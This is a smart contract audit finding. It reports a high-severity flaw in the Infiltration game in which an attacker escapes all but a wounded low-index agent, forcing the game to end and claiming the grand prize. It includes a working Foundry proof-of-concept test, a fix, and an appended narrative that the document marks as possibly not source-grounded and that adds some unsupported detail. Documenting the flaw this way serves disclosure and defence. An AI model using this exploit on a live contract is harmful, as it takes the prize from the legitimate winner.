---
id: 20372
severity: "High"
---

# Attacker can steal reward of actual winner by

## Description

Currently following scenario is possible: There is an attacker owning some lower index agents and some higher index agents. There is a normal user owing one agent with an index between the attackers agents. If one of the attackers agents with an lower index gets wounded, he can escape all other agents and will instantly win the game, even if the other User has still one active agent. This is possible because because the winner is determined by the agent index, and escaping all agents at once wont kill the wounded agent because the game instantly ends. Following check inside startNewRound prevents killing of wounded agents by starting a new round:
```solidity
uint256 activeAgents = gameInfo.activeAgents;
if (activeAgents == 1) {
    revert GameOver();
}
```
Following check inside of claimPrize pays price to first ID agent:
```solidity
uint256 agentId = agents[1].agentId;
_assertAgentOwnership(agentId);
```
See following POC: Attacker can steal the grand price of the actual winner by force ending the game trough escapes. This also introduces problems if there are other players with wounded agents but lower < 50 TokenID, they can claim prices for wounded agents, which will break parts of the game logic.

## Proof of Concept

Put this into Infiltration.mint.t.sol and run forge test --match-test forceWin -vvv
```solidity
function test_forceWin() public {
    address attacker = address(1337);
    //prefund attacker and user1
    vm.deal(user1, PRICE * MAX_MINT_PER_ADDRESS);
    vm.deal(attacker, PRICE * MAX_MINT_PER_ADDRESS);
    // MINT some agents
    vm.warp(_mintStart());
    // attacker wants to make sure he owns a bunch of agents with low IDs!!
    vm.prank(attacker);
    infiltration.mint{value: PRICE * 30}({quantity: 30});
    // For simplicity we mint only 1 agent to user 1 here, but it could be more, they could get wounded, etc.
    vm.prank(user1);
    infiltration.mint{value: PRICE *1}({quantity: 1});
    //Attacker also wants a bunch of agents with the highest IDs, as they are getting swapped with the killed agents (move forward)
    vm.prank(attacker);
    infiltration.mint{value: PRICE * 30}({quantity: 30});
    vm.warp(_mintEnd());
    //start the game
    vm.prank(owner);
    infiltration.startGame();
    vm.prank(VRF_COORDINATOR);
    uint256[] memory randomWords = new uint256[](1);
    randomWords[0] = 69_420;
    VRFConsumerBaseV2(address(infiltration)).rawFulfillRandomWords(_computeVrfRequestId(1), randomWords);
    // Now we are in round 2 we do have 1 wounded agent (but we can imagine any of our agent got wounded, doesnt really matter)
    // we know with our HARDCODED RANDOMNESS THAT AGENT 3 gets wounded!!
    // Whenever we get in a situation, that we own all active agents, but 1 and our agent has a lower index we can instant win the game!!
    // This is done by escaping all agents, at once, except the lowest index
    uint256[] memory escapeIds = new uint256[](59);
    escapeIds[0] = 1;
    escapeIds[1] = 2;
    uint256 i = 4; //Scipping our wounded AGENT 3
    for(; i < 31;) {
        escapeIds[i-2] = i;
        unchecked {++i;}
    }
    //skipping 31 as this owned by user1
    unchecked {++i;}
    for(; i < 62;) {
        escapeIds[i-3] = i;
        unchecked {++i;}
    }
    vm.prank(attacker);
    infiltration.escape(escapeIds);
    (uint16 activeAgents, uint16 woundedAgents, , uint16 deadAgents, , , , , , , ) = infiltration.gameInfo();
    console.log("Active", activeAgents);
    assertEq(activeAgents, 1);
    // This will end the game instantly.
    //owner should not be able to start new round
    vm.roll(block.number + BLOCKS_PER_ROUND);
    vm.prank(owner);
    vm.expectRevert();
    infiltration.startNewRound();
    //Okay so the game is over, makes sense!
    // Now user1 has the only active AGENT, so he should claim the grand prize!
    // BUT user1 cannot
    vm.expectRevert(IInfiltration.NotAgentOwner.selector);
    vm.prank(user1);
    infiltration.claimGrandPrize();
    //instead the attacker can:
    vm.prank(attacker);
    infiltration.claimGrandPrize();
}
```

## Recommendation

Start a new Round before the real end of game to clear all wounded agents and reorder IDs.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The contract contains a logic flaw that allows an attacker to force‑end a game round and claim the grand prize that rightfully belongs to another player. The game determines the winner solely by the smallest agent identifier (index) that is still active. When an agent is wounded the contract does not immediately remove it; instead the game can be ended by calling the escape function, which removes any number of agents in a single transaction. Because the escape routine does not check whether a wounded agent is being protected, an attacker who owns a low‑index wounded agent and also controls a set of higher‑index agents can invoke escape on every other agent except the wounded one. After the escape call the internal counter `activeAgents` becomes one, triggering the early‑exit condition in `startNewRound` (`if (activeAgents == 1) revert GameOver();`). The game therefore finishes instantly even though another user still has an active, higher‑index agent. When the prize is claimed the contract reads the first entry in the agents array (`agents[1].agentId`) and verifies ownership against that identifier. Since the attacker owns the low‑index agent, the ownership check passes and the attacker can call `claimGrandPrize` and receive the full reward. The victim, who still controls the only non‑wounded agent, is unable to claim the prize because the contract now believes the game is over and the winner is the low‑index agent. This bug manifests only when an attacker can acquire both low and high index agents and a round contains at least one wounded agent. It was discovered during a formal audit by reproducing the scenario in a Forge test that forced a win by escaping agents. The issue is subtle because the winner‑selection logic based on identifier order appears reasonable, and the escape function’s bulk removal is not obviously unsafe. The impact is high: funds intended for the legitimate winner are stolen, the game’s accounting is broken, and other participants may be unable to receive any reward. To remediate, the protocol should either force a new round before the game can be terminated, thereby clearing wounded agents and re‑ordering identifiers, or redesign the winner determination to consider only agents that are alive and not wounded. Additionally, the escape function should prevent removal of all agents except a wounded one, and the prize‑claim logic should reference the actual surviving winner rather than the first array entry. Implementing these changes restores the intended fairness and prevents an attacker from hijacking the prize.
